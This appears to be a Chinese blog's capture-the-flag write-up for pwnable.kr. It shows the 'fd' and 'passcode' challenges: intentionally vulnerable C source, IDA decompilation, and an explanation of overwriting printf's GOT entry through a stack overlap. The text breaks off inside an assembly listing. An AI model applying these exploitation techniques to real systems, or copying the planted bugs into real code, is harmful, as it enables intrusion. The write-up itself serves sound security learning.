<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Pwnable.kr - JuicyMio&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="Pwnable.kr" />
<meta property="og:description" content="pwnable.kr writeup 1 fd文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://juicymio.github.io/pwnable.kr/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-12T17:19:11+08:00" />
<meta property="article:modified_time" content="2022-10-12T17:19:11+08:00" />

<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Pwnable.kr"/>
<meta name="twitter:description" content="pwnable.kr writeup 1 fd文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文"/>
<meta name="application-name" content="JuicyMio&#39;s blog">
<meta name="apple-mobile-web-app-title" content="JuicyMio&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://juicymio.github.io/pwnable.kr/" /><link rel="next" href="http://juicymio.github.io/c/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Pwnable.kr",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/juicymio.github.io\/pwnable.kr\/"
        },"genre": "posts","keywords": "pwn","wordcount":  6209 ,
        "url": "http:\/\/juicymio.github.io\/pwnable.kr\/","datePublished": "2022-10-12T17:19:11+08:00","dateModified": "2022-10-12T17:19:11+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "JuicyMio"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="JuicyMio&#39;s blog">JuicyMio&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friend/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="JuicyMio&#39;s blog">JuicyMio&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friend/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pwnable.kr</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>JuicyMio</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6209 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="true">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-fd">1 fd</a></li>
    <li><a href="#2-collision">2 collision</a></li>
    <li><a href="#5-passcode">5 passcode</a>
      <ul>
        <li><a href="#实现">实现:</a></li>
      </ul>
    </li>
    <li><a href="#6-random">6 random</a></li>
    <li><a href="#7-input">7 input</a></li>
    <li><a href="#8-leg">8 leg</a></li>
    <li><a href="#9-mistake">9 mistake</a></li>
    <li><a href="#10-shellshock">10 shellshock</a></li>
    <li><a href="#11-coin1">11 coin1</a></li>
    <li><a href="#12-blackjack">12 blackjack</a></li>
    <li><a href="#13-lotto">13 lotto</a></li>
    <li><a href="#14-cmd1">14 cmd1</a></li>
    <li><a href="#15-cmd2">15 cmd2</a></li>
    <li><a href="#16-uaf">16 uaf</a>
      <ul>
        <li><a href="#unexploitable">unexploitable</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="pwnablekr-writeup" class="headerLink">
    <a href="#pwnablekr-writeup" class="header-mark"></a>pwnable.kr writeup</h1><h2 id="1-fd" class="headerLink">
    <a href="#1-fd" class="header-mark"></a>1 fd</h2><p>文件描述符(file descricptor)</p>
<blockquote>
<p>维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。</p>
</blockquote>
<p>习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//fd.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;pass argv[1] a number</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">len</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="s">&#34;LETMEWIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;good job :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;learn about Linux file IO</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中atoi是将字符串转化为整数的函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.</p>
<p>例如运行程序fd</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./fd 4660
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时argc值为2, 而argv[0] = &ldquo;./fd&rdquo;, argv[1] = &ldquo;4660&rdquo;</p>
<p>atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag</p>
<h2 id="2-collision" class="headerLink">
    <a href="#2-collision" class="header-mark"></a>2 collision</h2><h2 id="5-passcode" class="headerLink">
    <a href="#5-passcode" class="header-mark"></a>5 passcode</h2><p><strong>这题没太懂GOT PLT那里的具体原理</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;checking...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;&amp;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Login OK!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Login Failed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="nf">welcome</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">login</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// something after login...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>容易注意到login函数中这句</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>本应该为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">passcode1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容.
那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符.
用IDA反编译一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">login</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;checking...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">!=</span> <span class="mi">338150</span> <span class="o">||</span> <span class="n">v2</span> <span class="o">!=</span> <span class="mi">13371337</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Login Failed!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Login OK!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">welcome</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+18h] [ebp-70h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+7Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system(&quot;/bin/cat flag&quot;)这个指令了.
在IDA里找到他们:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.plt:08048420
</span></span><span class="line"><span class="cl">.plt:08048420 ; =============== S U B R O U T I N E =======================================
</span></span><span class="line"><span class="cl">.plt:08048420
</span></span><span class="line"><span class="cl">.plt:08048420 ; Attributes: thunk
</span></span><span class="line"><span class="cl">.plt:08048420
</span></span><span class="line"><span class="cl">.plt:08048420 ; int printf(const char *format, ...)
</span></span><span class="line"><span class="cl">.plt:08048420 _printf         proc near               ; CODE XREF: login+E↓p
</span></span><span class="line"><span class="cl">.plt:08048420                                         ; login+3C↓p ...
</span></span><span class="line"><span class="cl">.plt:08048420
</span></span><span class="line"><span class="cl">.plt:08048420 format          = dword ptr  4
</span></span><span class="line"><span class="cl">.plt:08048420
</span></span><span class="line"><span class="cl">.plt:08048420                 jmp     ds:off_804A000
</span></span><span class="line"><span class="cl">.plt:08048420 _printf         endp
</span></span><span class="line"><span class="cl">.plt:08048420
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
